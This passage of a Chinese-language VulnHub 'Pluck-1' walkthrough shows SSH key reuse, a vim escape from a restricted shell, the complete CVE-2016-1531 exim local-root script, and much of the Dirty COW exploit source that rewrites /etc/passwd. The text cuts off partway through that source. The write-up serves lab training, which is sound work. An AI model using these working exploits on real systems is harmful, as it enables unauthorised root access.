class="line">home/paul/.bashrc</span><br><span class="line">home/paul/.profile</span><br><span class="line">home/paul/.bash_logout</span><br><span class="line">home/peter/</span><br><span class="line">home/peter/.bashrc</span><br><span class="line">home/peter/.profile</span><br><span class="line">home/peter/.bash_logout</span><br><span class="line">var/www/html/</span><br><span class="line">var/www/html/fonts/</span><br><span class="line">var/www/html/fonts/glyphicons-halflings-regular.svg</span><br><span class="line">var/www/html/fonts/glyphicons-halflings-regular.woff2</span><br><span class="line">var/www/html/fonts/glyphicons-halflings-regular.ttf</span><br><span class="line">var/www/html/fonts/glyphicons-halflings-regular.woff</span><br><span class="line">var/www/html/fonts/glyphicons-halflings-regular.eot</span><br><span class="line">var/www/html/about.php</span><br><span class="line">var/www/html/index.php</span><br><span class="line">var/www/html/footer.php</span><br><span class="line">var/www/html/css/</span><br><span class="line">var/www/html/css/bootstrap.css.map</span><br><span class="line">var/www/html/css/bootstrap.min.css.map</span><br><span class="line">var/www/html/css/bootstrap-theme.css</span><br><span class="line">var/www/html/css/bootstrap-theme.min.css</span><br><span class="line">var/www/html/css/bootstrap.min.css</span><br><span class="line">var/www/html/css/bootstrap-theme.min.css.map</span><br><span class="line">var/www/html/css/bootstrap-theme.css.map</span><br><span class="line">var/www/html/css/bootstrap.css</span><br><span class="line">var/www/html/header.php</span><br><span class="line">var/www/html/admin.php</span><br><span class="line">var/www/html/js/</span><br><span class="line">var/www/html/js/jquery.min.js</span><br><span class="line">var/www/html/js/bootstrap.js</span><br><span class="line">var/www/html/js/npm.js</span><br><span class="line">var/www/html/js/bootstrap.min.js</span><br><span class="line">root@kali:~/vulnhub/pluck-1<span class="comment"># ls</span></span><br><span class="line">backup  backup.tar  backup.tar64</span><br></pre></td></tr></table></figure>
+
+<p>解压缩文件后，注意到存在包含用户Paul SSH密钥的keys文件夹，将测试这些密钥，直到获得有效的SSH登录密匙</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/pluck-1/backup/home/paul/keys<span class="comment"># ssh paul@192.168.56.121 -i id_key4</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub243.jpg"></li>
+</ul>
+<p>在这种情况下，看到的是菜单类型的Shell登录，但是可以通过选择Edit file并输入任何文件名来退出该菜单，以开始使用vim。</p>
+<p>输入下面的vim命令来设置shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后输入以下内容以跳至Bash shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<p>成功获取了shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/pluck-1/backup/home/paul/keys<span class="comment"># ssh paul@192.168.56.121 -i id_key4                                      </span></span><br><span class="line">Last login: Thu Apr  9 07:55:00 2020 from 192.168.56.1</span><br><span class="line"></span><br><span class="line">paul@pluck:~$ <span class="built_in">id</span></span><br><span class="line">uid=1002(paul) gid=1002(paul) <span class="built_in">groups</span>=1002(paul)</span><br><span class="line">paul@pluck:~$ <span class="built_in">whoami</span></span><br><span class="line">paul</span><br><span class="line">paul@pluck:~$</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub244.jpg"></li>
+</ul>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>尝试使用内核漏洞进行提权，但是运气不好，但是在搜索SUID之后，可以注意到exim agent的存在。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">paul@pluck:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/exim/bin/exim-4.84-7                                                                                                  </span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/s-nail/s-nail-privsep</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/ntfs-3g</span><br></pre></td></tr></table></figure>
+
+<p>尝试了一些漏洞利用exim代理来提升权限，但不起作用，但是决定尝试一下此漏洞，因为版本差异很小，幸运的是，此漏洞起作用。</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzk1MzU=">Exim-4.84-3-Local-Privilege-Escalation<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>exploitation</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># CVE-2016-1531 exim &lt;= 4.84-3 local root exploit</span></span><br><span class="line"><span class="comment"># ===============================================</span></span><br><span class="line"><span class="comment"># you can write files as root or force a perl module to</span></span><br><span class="line"><span class="comment"># load by manipulating the perl environment and running</span></span><br><span class="line"><span class="comment"># exim with the &quot;perl_startup&quot; arguement -ps. </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># e.g.</span></span><br><span class="line"><span class="comment"># [fantastic@localhost tmp]$ ./cve-2016-1531.sh </span></span><br><span class="line"><span class="comment"># [ CVE-2016-1531 local root exploit</span></span><br><span class="line"><span class="comment"># sh-4.3# id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=1000(fantastic) groups=1000(fantastic)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># -- Hacker Fantastic </span></span><br><span class="line"><span class="built_in">echo</span> [ CVE-2016-1531 <span class="built_in">local</span> root exploit</span><br><span class="line"><span class="built_in">cat</span> &gt; /tmp/root.pm &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">package root;</span></span><br><span class="line"><span class="string">use strict;</span></span><br><span class="line"><span class="string">use warnings;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</span><br></pre></td></tr></table></figure>
+
+<p>提权过程脚本内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /tmp/root.pm &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">package root;</span></span><br><span class="line"><span class="string">use strict;</span></span><br><span class="line"><span class="string">use warnings;</span></span><br><span class="line"><span class="string">system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</span><br></pre></td></tr></table></figure>
+
+<p>提权，成功获取到了flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">aul@pluck:~$ <span class="built_in">cat</span> &gt; /tmp/root.pm &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">&gt; package root;</span></span><br><span class="line"><span class="string">&gt; use strict;</span></span><br><span class="line"><span class="string">&gt; use warnings;</span></span><br><span class="line"><span class="string">&gt; system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="string">&gt; EOF</span></span><br><span class="line">paul@pluck:~$ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1002(paul) <span class="built_in">groups</span>=1002(paul)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line"></span><br><span class="line">Congratulations you found the flag</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">######   ((((((((((((((((((((((((((((((</span></span><br><span class="line"><span class="comment">#########   (((((((((((((((((((((((((((</span></span><br><span class="line">,,<span class="comment">##########   ((((((((((((((((((((((((</span></span><br><span class="line">@@,,,<span class="comment">##########   (((((((((((((((((((((</span></span><br><span class="line">@@@@@,,,<span class="comment">##########                     </span></span><br><span class="line">@@@@@@@@,,,<span class="comment">############################</span></span><br><span class="line">@@@@@@@@@@@,,,<span class="comment">#########################</span></span><br><span class="line">@@@@@@@@@,,,<span class="comment">###########################</span></span><br><span class="line">@@@@@@,,,<span class="comment">##########                    </span></span><br><span class="line">@@@,,,<span class="comment">##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span></span><br><span class="line">,,,<span class="comment">##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span></span><br><span class="line"><span class="comment">##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span></span><br><span class="line"><span class="comment">#######   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub245.jpg"></li>
+</ul>
+<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDA4NDc=">Linux内核2.6.22-3.9-Dirty-COW-&#x2F;proc&#x2F;self&#x2F;mem-竞争条件提权-&#x2F;etc&#x2F;passwd方法<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>脏牛提权</p>
+<p>40847.cpp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line">// EDB-Note: Compile:   g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">// EDB-Note: Recommended way to run:   ./dcow -s    (Will automatically <span class="keyword">do</span> <span class="string">&quot;echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs&quot;</span>)</span><br><span class="line">//</span><br><span class="line">// -----------------------------------------------------------------</span><br><span class="line">// Copyright (C) 2016  Gabriele Bonacini</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License as published by</span><br><span class="line">// the Free Software Foundation; either version 3 of the License, or</span><br><span class="line">// (at your option) any later version.</span><br><span class="line">// This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line">// You should have received a copy of the GNU General Public License</span><br><span class="line">// along with this program; <span class="keyword">if</span> not, write to the Free Software Foundation,</span><br><span class="line">// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA</span><br><span class="line">// -----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fstream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string&gt;</span></span><br><span class="line"><span class="comment">#include &lt;thread&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;pwd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;pty.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;termios.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;signal.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define  BUFFSIZE    1024</span></span><br><span class="line"><span class="comment">#define  PWDFILE     &quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="comment">#define  BAKFILE     &quot;./.ssh_bak&quot;</span></span><br><span class="line"><span class="comment">#define  TMPBAKFILE  &quot;/tmp/.ssh_bak&quot;</span></span><br><span class="line"><span class="comment">#define  PSM         &quot;/proc/self/mem&quot;</span></span><br><span class="line"><span class="comment">#define  ROOTID      &quot;root:&quot;</span></span><br><span class="line"><span class="comment">#define  SSHDID      &quot;sshd:&quot;</span></span><br><span class="line"><span class="comment">#define  MAXITER     300</span></span><br><span class="line"><span class="comment">#define  DEFPWD      &quot;$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/&quot;</span></span><br><span class="line"><span class="comment">#define  TXTPWD      &quot;dirtyCowFun\n&quot;</span></span><br><span class="line"><span class="comment">#define  DISABLEWB   &quot;echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs\n&quot;</span></span><br><span class="line"><span class="comment">#define  EXITCMD     &quot;exit\n&quot;</span></span><br><span class="line"><span class="comment">#define  CPCMD       &quot;cp &quot;</span></span><br><span class="line"><span class="comment">#define  RMCMD       &quot;rm &quot;</span></span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class Dcow&#123;</span><br><span class="line">    private:</span><br><span class="line">       bool              run,        rawMode,     opShell,   restPwd;</span><br><span class="line">       void              *map;</span><br><span class="line">       int               fd,         iter,        master,    wstat;</span><br><span class="line">       string            buffer,     etcPwd,      etcPwdBak,</span><br><span class="line">                         root,       user,        <span class="built_in">pwd</span>,       sshd;</span><br><span class="line">       thread            *writerThr, *madviseThr, *checkerThr;</span><br><span class="line">       ifstream          *extPwd;</span><br><span class="line">       ofstream          *extPwdBak;</span><br><span class="line">       struct passwd     *userId;</span><br><span class="line">       pid_t             child;  </span><br><span class="line">       char              buffv[BUFFSIZE];</span><br><span class="line">       fd_set            rfds;</span><br><span class="line">       struct termios    termOld,    termNew;</span><br><span class="line">       ssize_t           ign;</span><br><span class="line"></span><br><span class="line">       void exitOnError(string msg);</span><br><span class="line">    public:</span><br><span class="line">       Dcow(bool opSh, bool rstPwd);</span><br><span class="line">       ~Dcow(void);</span><br><span class="line">       int  expl(void);         </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Dcow::Dcow(bool opSh, bool rstPwd) : run(<span class="literal">true</span>), rawMode(<span class="literal">false</span>), opShell(opSh), restPwd(rstPwd),</span><br><span class="line">                   iter(0), wstat(0), root(ROOTID), <span class="built_in">pwd</span>(DEFPWD), sshd(SSHDID), writerThr(nullptr),</span><br><span class="line">                   madviseThr(nullptr), checkerThr(nullptr), extPwd(nullptr), extPwdBak(nullptr), </span><br><span class="line">                   child(0)&#123; </span><br><span class="line">   userId = getpwuid(getuid());</span><br><span class="line">   user.append(userId-&gt;pw_name).append(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">   extPwd = new ifstream(PWDFILE);   </span><br><span class="line">   <span class="keyword">while</span> (getline(*extPwd, buffer))&#123;</span><br><span class="line">       buffer.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">       etcPwdBak.append(buffer);</span><br><span class="line">       <span class="keyword">if</span>(buffer.find(root) == 0)&#123;</span><br><span class="line">          etcPwd.insert(0, root).insert(root.size(), <span class="built_in">pwd</span>);</span><br><span class="line">          etcPwd.insert(etcPwd.begin() + root.size() + pwd.size(), </span><br><span class="line">                        buffer.begin() + buffer.find(<span class="string">&quot;:&quot;</span>, root.size()), buffer.end());</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(buffer.find(user) == 0 ||  buffer.find(sshd) == 0 )&#123;</span><br><span class="line">          etcPwd.insert(0, buffer);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          etcPwd.append(buffer);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   extPwdBak = new ofstream(restPwd ? TMPBAKFILE : BAKFILE);</span><br><span class="line">   extPwdBak-&gt;write(etcPwdBak.c_str(), etcPwdBak.size());</span><br><span class="line">   extPwdBak-&gt;close();</span><br><span class="line">   fd = open(PWDFILE,O_RDONLY);</span><br><span class="line">   map = mmap(nullptr, etcPwdBak.size(), PROT_READ,MAP_PRIVATE, fd, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Dcow::~Dcow(void)&#123;</span><br><span class="line">   extPwd-&gt;close();</span><br><span class="line">   close(fd);</span><br><span class="line">   delete extPwd; delete extPwdBak; delete madviseThr; delete writerThr; delete checkerThr;</span><br><span class="line">   <span class="keyword">if</span>(rawMode)    tcsetattr(STDIN_FILENO, TCSANOW, &amp;termOld);</span><br><span class="line">   <span class="keyword">if</span>(child != 0) <span class="built_in">wait</span>(&amp;wstat); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Dcow::exitOnError(string msg)&#123;</span><br><span class="line">      cerr &lt;&lt; <span class="string">msg &lt;&lt; endl;</span></span><br><span class="line"><span class="string">      // if(child != 0) kill(child, SIGKILL);</span></span><br><span class="line"><span class="string">      throw new exception();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int  Dcow::expl(void)&#123;</span></span><br><span class="line"><span class="string">   madviseThr = new thread([&amp;]()&#123; while(run)&#123; madvise(map, etcPwdBak.size(), MADV_DONTNEED);&#125; &#125;);</span></span><br><span class="line"><span class="string">   writerThr  = new thread([&amp;]()&#123; int fpsm = open(PSM,O_RDWR);  </span></span><br><span class="line"><span class="string">                                  while(run)&#123; lseek(fpsm, reinterpret_cast&lt;off_t&gt;(map), SEEK_SET); </span></span><br><span class="line"><span class="string">                                              ign = write(fpsm, etcPwd.c_str(), etcPwdBak.size()); &#125;</span></span><br><span class="line"><span class="string">                                &#125;);</span></span><br><span class="line"><span class="string">   checkerThr = new thread([&amp;]()&#123; while(iter &lt;= MAXITER)&#123; </span></span><br><span class="line"><span class="string">                                         extPwd-&gt;clear(); extPwd-&gt;seekg(0, ios::beg); </span></span><br><span class="line"><span class="string">                                         buffer.assign(istreambuf_iterator&lt;char&gt;(*extPwd),</span></span><br><span class="line"><span class="string">                                                       istreambuf_iterator&lt;char&gt;());</span></span><br><span class="line"><span class="string">                                         if(buffer.find(pwd) != string::npos &amp;&amp; </span></span><br><span class="line"><span class="string">                                            buffer.size() &gt;= etcPwdBak.size())&#123;</span></span><br><span class="line"><span class="string">                                                run = false; break;</span></span><br><span class="line"><span class="string">                                         &#125;</span></span><br><span class="line"><span class="string">                                         iter ++; usleep(300000);</span></span><br><span class="line"><span class="string">                                   &#125;</span></span><br><span class="line"><span class="string">                                   run = false;</span></span><br><span class="line"><span class="string">                                 &#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  cerr &lt;&lt; &quot;Running ...&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="string">  madviseThr-&gt;join();</span></span><br><span class="line"><span class="string">  writerThr-&gt;join();</span></span><br><span class="line"><span class="string">  checkerThr-&gt;join();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  if(iter &lt;= MAXITER)&#123; </span></span><br><span class="line"><span class="string">       child = forkpty(&amp;master, nullptr, nullptr, nullptr);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       if(child == -1) exitOnError(&quot;Error forking pty.&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       if(child == 0)&#123; </span></span><br><span class="line"><span class="string">          execlp(&quot;su&quot;, &quot;su&quot;, &quot;-&quot;, nullptr);</span></span><br><span class="line"><span class="string">          exitOnError(&quot;Error on exec.&quot;);</span></span><br><span class="line"><span class="string">       &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       if(opShell) cerr &lt;&lt; &quot;Password overridden to: &quot; &lt;&lt;  TXTPWD &lt;&lt; endl;</span></span><br><span class="line"><span class="string">       memset(buffv, 0, BUFFSIZE);</span></span><br><span class="line"><span class="string">       ssize_t bytes_read = read(master, buffv, BUFFSIZE - 1);</span></span><br><span class="line"><span class="string">       if(bytes_read &lt;= 0) 